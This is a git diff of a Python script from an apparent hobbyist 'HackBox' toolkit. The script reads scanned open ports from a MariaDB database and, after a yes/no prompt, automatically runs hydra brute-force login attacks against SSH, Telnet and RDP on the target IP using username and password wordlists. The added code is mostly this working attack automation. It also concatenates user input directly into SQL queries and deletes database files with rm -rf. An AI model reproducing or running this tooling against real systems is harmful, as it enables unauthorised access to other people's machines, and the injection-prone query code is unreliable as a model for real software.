@@ -4,6 +4,7 @@
 ## will eventually be integrated with a database (mariadb?) for storing scanned IP addresses 
 
 
+## this script must be run as root!!
 ## notes: db change: hackbox_db > 127.0.0.1 (or other IP) etc > each ip has a list of ports
 
 ## Dependencies: Nmap
@@ -11,6 +12,9 @@
 import os
 import mysql.connector
 import subprocess as sp
+
+## -- global vars -- ##
+
 
 ## -- SQL connection -- ##
 mydb = mysql.connector.connect(
@@ -32,7 +36,7 @@ print(r"""
 \_| |_/\___/  \_/  \___/       \_/\_| |_/\____/\_| \_/
         """)
 
-print("DevNote: The MariaDB formatting is a little wonky at the moment, will get fixed eventually ")
+
 
 ## --- Menu --- ###
 print("""
@@ -62,9 +66,8 @@ statement = input("").lower()
 while True:
     ## reload statement/variable, needs to be at top so accessible to all further down
     if statement == 'reload':
-        os.system('python3 /Modules/attack/AutoTack/autotack.py')
-        reload = os.system('python3 /Modules/attack/AutoTack/autotack.py')
-
+        os.system('python3 Modules/attack/autotack/autotack.py')
+        #reload = os.system('python3 Modules/attack/autotack/autotack.py')
 ## --- interface --- ###
 
     ## --- entering into database + scan --- ##
@@ -104,26 +107,79 @@ while True:
         print("----------")
 
     ## -- Pulling from DB and scanning -- ##
-
+        #removing tmp below incase it already exists. cant overwrite, its a limitation of sql
+        os.system(" rm -rf /var/lib/mysql/hackbox_ip_db/tmp")
         mycursor.execute("SELECT * FROM " + targetIPinput + " INTO OUTFILE 'tmp'") ## writes to /var/lib/mysql/hackbox_ip_db/tmp
 
-        print('--')
-        print(targetIPinput)
+        #print('--')
 
-        #print(ippull)
-        #f = open("tmp", "w")
-        #f.write(ippull)
 
-        f = open("/var/lib/mysql/hackbox_ip_db/tmp", "r")
-        print(f.read())
+        ## This pulls the port number from the db - in future will add service puller too (ex ssh)
+        attackList = sp.getoutput('cat /var/lib/mysql/hackbox_ip_db/tmp | grep -o "[0-9]"*')
 
+        #print('Open Ports are:')
+        #print(attackList)
         ## this will output the ports stored. Now need to write AI/if commands for detecting ports
         ## ex: if 22 in tmp:
         ## then protocolcrack ssh or soemthing
 
+        ##Final Confirmation
+        print("Begin Attack? (y/N)")
+        beginattack = input().lower()
+        if 'y' in beginattack:
 
-    ## cleaning up ##
+        ## -- Module Integration -- ## -- maybe have attack results saved somewhere, maybe in db???
+            print('Enter Wordlist locations, or hit enter/leave blank for default')
+            print('For reference, Your current Directory:')
+            os.system('pwd')
 
+            print('\nUsername List:\n')
+            userlist = input().lower()
+            print('\nPassword List:\n')
+            passlist = input().lower()
+
+            if userlist == "":
+                userlist = 'Modules/attack/systemaccess/protocolcracker/simpleuser.txt'
+            if passlist == "":
+                passlist = 'Modules/attack/systemaccess/protocolcracker/simplepass.txt'
+
+            if '22' in attackList:
+                print('----------')
+                print('\nStarting SSH bruteforce\n')
+                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ssh://' + targetIP  )
+
+                #os.system('hydra -I -L Modules/attack/systemaccess/protocolcracker/simpleuser.txt -P Modules/attack/systemaccess/protocolcracker/simplepass.txt ssh://' + targetIP  )
+
+            if '23' in attackList:
+                print('----------')
+                print('\nStarting TELNET bruteforce\n')
+                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' telnet://' + targetIP  )
+                ## later on add more options, like level of depth of scan, for now this will use basic login creds
+                print('--')
+
+            if '3389' in attackList:
+                print('--')
+                print('Starting RDP bruteforce')
+                print('\n')
+                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' rdp://' + targetIP  )
+                ## later on add more options, like level of depth of scan, for now this will use basic login creds
+                print('----------')
+
+
+                ## Final stuff
+            print('----------')
+            print('\nAttack completed, scroll through stdout to see if successful! Text should be green!\n')
+            print('\nType reload to head back to the main menu\n')
+        ## -- logging -- ##
+            #logfile = open("logs/autotack.log", "a")
+            #logfile.write(log)
+            #logfile.close
+        elif 'n' in beginattack:
+            reload
+        else:
+            reload
+
+        ## cleaning up ##
         #removing tmp cause I dont know how to overwrite the file with mariadb yet :(
         os.system(" rm -rf /var/lib/mysql/hackbox_ip_db/tmp")
 
@@ -137,9 +193,15 @@ while True:
         ipsummoninput = convertback
         #print(ipsummoninput)
 
+        os.system('rm -rf /var/lib/mysql/hackbox_ip_db/ipcall_tmp')
         mycursor.execute("USE hackbox_ip_db")
-        mycursor.execute("SELECT * FROM " + ipsummoninput)
-
+        mycursor.execute("SELECT * FROM " + ipsummoninput + " INTO OUTFILE 'ipcall_tmp'")
+        ipcall = sp.getoutput('cat /var/lib/mysql/hackbox_ip_db/ipcall_tmp | grep -e "[0-9]"*/*')
+        print('\n')
+        print(ipsummon + "'s open ports and services:")
+        print('----------')
+        print(ipcall)
+        print('----------')
 
 
 
@@ -187,7 +249,8 @@ while True:
         for x in mycursor:
             print (x)
         print('Database Created!')
-
+    elif statement == 'q':
+        os.system('python3 HackBox.py')
 
     else:
         print('ya broke it doofus')
